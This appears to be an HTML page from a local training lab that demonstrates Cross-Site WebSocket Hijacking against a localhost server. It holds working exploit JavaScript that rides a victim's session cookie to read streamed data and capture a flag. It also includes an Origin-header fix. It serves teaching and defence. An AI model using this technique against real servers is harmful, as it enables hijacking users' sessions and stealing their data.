@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X5 — Cross-Site WebSocket Hijacking Exploit</title>
+  <style>
+    body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; padding: 24px; margin: 0; }
+    h1 { color: #3fb950; font-size: 1.2rem; margin-bottom: 16px; }
+    h2 { color: #58a6ff; font-size: 1rem; margin: 16px 0 8px; }
+    .terminal { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 12px 0; white-space: pre-wrap; font-size: 0.85rem; min-height: 60px; }
+    .status { color: #d29922; }
+    .success { color: #3fb950; }
+    .error { color: #f85149; }
+    button { background: #238636; color: #e6edf3; border: 1px solid #3fb950; border-radius: 4px; padding: 8px 16px; cursor: pointer; font-family: inherit; margin: 4px 2px; }
+    button:hover { background: #2ea043; }
+    input[type=text] { background: #161b22; color: #e6edf3; border: 1px solid #30363d; border-radius: 4px; padding: 8px; font-family: inherit; width: 100%; margin: 4px 0 8px; }
+    label { color: #7d8590; font-size: 0.85rem; }
+    a { color: #58a6ff; }
+    .badge { display: inline-block; font-size: 0.75rem; padding: 2px 8px; border-radius: 12px; margin-right: 6px; }
+    .attacker-badge { background: rgba(248,81,73,0.15); border: 1px solid #f85149; color: #f85149; }
+    .victim-badge { background: rgba(88,166,255,0.15); border: 1px solid #58a6ff; color: #58a6ff; }
+
+    .origin-bar {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      font-size: 0.82rem;
+      display: flex;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+    .code-block {
+      background: #161b22;
+      border: 1px solid #388bfd44;
+      border-left: 3px solid #58a6ff;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 10px 0;
+      white-space: pre;
+      font-size: 0.82rem;
+      overflow-x: auto;
+    }
+    .flag-box {
+      background: rgba(63,185,80,0.08);
+      border: 1px solid #3fb950;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 12px 0;
+      font-size: 1rem;
+    }
+    .info-box {
+      background: rgba(88,166,255,0.06);
+      border: 1px solid #388bfd44;
+      border-radius: 6px;
+      padding: 12px 16px;
+      margin: 12px 0;
+      font-size: 0.83rem;
+      color: #93c5fd;
+      line-height: 1.6;
+    }
+    .conn-indicator {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #30363d;
+      margin-right: 6px;
+      vertical-align: middle;
+      transition: background 0.3s;
+    }
+    .conn-indicator.connecting { background: #d29922; animation: pulse 1s infinite; }
+    .conn-indicator.open       { background: #3fb950; }
+    .conn-indicator.closed     { background: #f85149; }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.4; }
+    }
+    .conn-status-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.85rem;
+      margin-bottom: 12px;
+    }
+    .btn-row { display: flex; gap: 8px; flex-wrap: wrap; }
+    .btn-danger {
+      background: #21262d;
+      border-color: #f85149;
+      color: #f85149;
+    }
+    .btn-danger:hover { background: rgba(248,81,73,0.1); }
+    .nav { margin-bottom: 20px; font-size: 0.82rem; }
+    .divider { border: none; border-top: 1px solid #21262d; margin: 20px 0; }
+    .msg-count { color: #7d8590; font-size: 0.8rem; margin-left: 8px; }
+  </style>
+</head>
+<body>
+
+  <div class="nav"><a href="index.html">← Exploit Console</a></div>
+
+  <h1>[X5] Cross-Site WebSocket Hijacking (CSWSH)</h1>
+
+  <div class="origin-bar">
+    <span><span class="badge attacker-badge">ATTACKER</span> http://localhost:3001 <em style="color:#6e7681">(this page)</em></span>
+    <span><span class="badge victim-badge">TARGET</span> ws://localhost:3000/ws/x5 <em style="color:#6e7681">(victim WebSocket)</em></span>
+  </div>
+
+  <p style="color:#7d8590; font-size:0.85rem; margin: 0 0 12px;">
+    WebSocket connections bypass Same-Origin Policy in a key way: the browser
+    <em>automatically includes cookies</em> from the target domain when opening a WebSocket,
+    even if the page initiating the connection is on a different origin.
+    The server must validate the <code>Origin</code> header during the WebSocket handshake — if it doesn't,
+    any attacker page can impersonate the victim.
+  </p>
+
+  <div class="info-box">
+    <strong>Why this works:</strong> SOP prevents cross-origin scripts from <em>reading</em> HTTP responses,
+    but it does not prevent <em>opening</em> WebSocket connections. The browser sends the victim's
+    <code>localhost:3000</code> session cookie automatically because that cookie's domain matches the
+    WebSocket target — just as it would for a same-origin connection.
+    If the server only checks the cookie (not the Origin header), any page on any domain can connect as the victim.
+  </div>
+
+  <div class="conn-status-row">
+    <span class="conn-indicator" id="indicator"></span>
+    <span id="conn-label" class="status">Disconnected</span>
+    <span class="msg-count" id="msg-count"></span>
+  </div>
+
+  <div class="btn-row">
+    <button onclick="connectWebSocket()">Connect WebSocket as Victim</button>
+    <button class="btn-danger" onclick="disconnectWebSocket()">Disconnect</button>
+    <button onclick="clearOutput()" style="background:#21262d; border-color:#30363d;">Clear Messages</button>
+  </div>
+
+  <h2>Connection Log</h2>
+  <div class="terminal" id="log"><span class="status">Press "Connect WebSocket as Victim" to start.</span></div>
+
+  <h2>Messages Received from Victim Server</h2>
+  <div class="terminal" id="messages"><span class="status">No messages yet.</span></div>
+
+  <div id="flag-container" style="display:none;">
+    <h2>Flag Captured</h2>
+    <div class="flag-box success" id="flag-display"></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <h2>Exploit Code</h2>
+  <div class="code-block">// Open a WebSocket connection to the victim server.
+// The browser automatically includes cookies from localhost:3000
+// because WebSocket connections carry the target domain's cookies —
+// the Same-Origin Policy only restricts *reading* cross-origin HTTP responses,
+// not *opening* WebSocket connections to any origin.
+
+const ws = new WebSocket('ws://localhost:3000/ws/x5');
+
+ws.onopen = () => {
+  // We are now connected. The server authenticated us using the victim's session cookie.
+  // Any data the server streams to this socket is now visible to the attacker.
+  status.textContent = 'Connected! Waiting for messages...';
+};
+
+ws.onmessage = (e) => {
+  const data = JSON.parse(e.data);
+  output.textContent += JSON.stringify(data, null, 2) + '\n';
+
+  // If the server sends a flag, capture it
+  if (data.flag) {
+    flagDisplay.textContent = 'FLAG CAPTURED: ' + data.flag;
+  }
+};
+
+ws.onerror = (e) => {
+  // Connection failed — victim server may not be running,
+  // or the server correctly rejected the cross-origin handshake.
+  status.textContent = 'Error — check that the victim server is running and you are logged in.';
+};
+
+ws.onclose = (e) => {
+  status.textContent = 'Connection closed (code ' + e.code + ')';
+};</div>
+
+  <h2>The Fix: Validate the Origin Header</h2>
+  <div class="code-block">// During the WebSocket upgrade handshake, the server receives an Origin header.
+// A secure server validates it against an allowlist before accepting the upgrade.
+
+// Node.js / ws library example:
+const wss = new WebSocket.Server({ noServer: true });
+
+server.on('upgrade', (req, socket, head) => {
+  const origin = req.headers.origin;
+
+  // Reject connections from untrusted origins
+  if (origin !== 'http://localhost:3000') {
+    socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
+    socket.destroy();
+    return;
+  }
+
+  wss.handleUpgrade(req, socket, head, (ws) => {
+    wss.emit('connection', ws, req);
+  });
+});</div>
+
+  <script>
+    let ws = null;
+    let messageCount = 0;
+
+    function setIndicator(state) {
+      const ind   = document.getElementById('indicator');
+      const label = document.getElementById('conn-label');
+      ind.className = 'conn-indicator ' + state;
+      if (state === 'connecting') { label.className = 'status';  label.textContent = 'Connecting...'; }
+      if (state === 'open')       { label.className = 'success'; label.textContent = 'Connected'; }
+      if (state === 'closed')     { label.className = 'error';   label.textContent = 'Disconnected'; }
+    }
+
+    function logLine(msg, cls) {
+      const logEl = document.getElementById('log');
+      if (logEl.querySelector('.status')) logEl.innerHTML = '';
+      const s = document.createElement('span');
+      s.className = cls || '';
+      s.textContent = msg + '\n';
+      logEl.appendChild(s);
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function appendMessage(text, cls) {
+      const msgEl = document.getElementById('messages');
+      if (msgEl.querySelector('.status')) msgEl.innerHTML = '';
+      const s = document.createElement('span');
+      s.className = cls || '';
+      s.textContent = text + '\n';
+      msgEl.appendChild(s);
+      msgEl.scrollTop = msgEl.scrollHeight;
+    }
+
+    function connectWebSocket() {
+      if (ws && ws.readyState <= 1) {
+        logLine('[!] Already connected or connecting.', 'status');
+        return;
+      }
+
+      messageCount = 0;
+      document.getElementById('msg-count').textContent = '';
+      document.getElementById('flag-container').style.display = 'none';
+      document.getElementById('messages').innerHTML = '<span class="status">Waiting for messages...</span>';
+
+      logLine('[*] Opening WebSocket: ws://localhost:3000/ws/x5', 'status');
+      logLine('[*] Browser will automatically include localhost:3000 session cookie.', 'status');
+      logLine('[*] This page is on http://localhost:3001 — a completely different origin.', 'status');
+
+      setIndicator('connecting');
+
+      // The core exploit — open a WebSocket to the victim server.
+      // The browser sends our localhost:3000 session cookie automatically.
+      ws = new WebSocket('ws://localhost:3000/ws/x5');
+
+      ws.onopen = () => {
+        setIndicator('open');
+        logLine('[+] WebSocket connection established!', 'success');
+        logLine('[+] Server accepted our cross-origin connection — victim session cookie was valid.', 'success');
+        logLine('[*] Listening for messages from victim server...', 'status');
+      };
+
+      ws.onmessage = (e) => {
+        messageCount++;
+        document.getElementById('msg-count').textContent = '(' + messageCount + ' message' + (messageCount !== 1 ? 's' : '') + ' received)';
+
+        let parsed;
+        try {
+          parsed = JSON.parse(e.data);
+        } catch(_) {
+          appendMessage('[raw] ' + e.data);
+          return;
+        }
+
+        const formatted = JSON.stringify(parsed, null, 2);
+        appendMessage(formatted);
+
+        // Hunt for flag
+        const raw = JSON.stringify(parsed);
+        const flagMatch = raw.match(/flag\{[^}]+\}/i);
+        if (parsed.flag || flagMatch) {
+          const flagValue = parsed.flag || (flagMatch && flagMatch[0]);
+          document.getElementById('flag-container').style.display = 'block';
+          document.getElementById('flag-display').textContent = 'FLAG CAPTURED: ' + flagValue;
+          logLine('[!!!] FLAG received in WebSocket message: ' + flagValue, 'success');
+        }
+      };
+
+      ws.onerror = () => {
+        setIndicator('closed');
+        logLine('[-] WebSocket error — connection failed.', 'error');
+        logLine('    Check: Is the victim server running at localhost:3000?', 'status');
+        logLine('    Check: Are you logged in at http://localhost:3000 (session cookie present)?', 'status');
+        logLine('    Check: Did the server reject the cross-origin handshake? (That means the fix is in!)', 'status');
+      };
+
+      ws.onclose = (e) => {
+        setIndicator('closed');
+        logLine('[*] WebSocket closed. Code: ' + e.code + (e.reason ? ' | Reason: ' + e.reason : ''), 'status');
+      };
+    }
+
+    function disconnectWebSocket() {
+      if (ws) {
+        ws.close(1000, 'Attacker disconnected');
+        ws = null;
+        logLine('[*] Manually disconnected.', 'status');
+      } else {
+        logLine('[!] No active connection.', 'status');
+      }
+    }
+
+    function clearOutput() {
+      document.getElementById('messages').innerHTML = '<span class="status">No messages yet.</span>';
+      messageCount = 0;
+      document.getElementById('msg-count').textContent = '';
+      document.getElementById('flag-container').style.display = 'none';
+    }
+  </script>
+
+</body>
+</html>
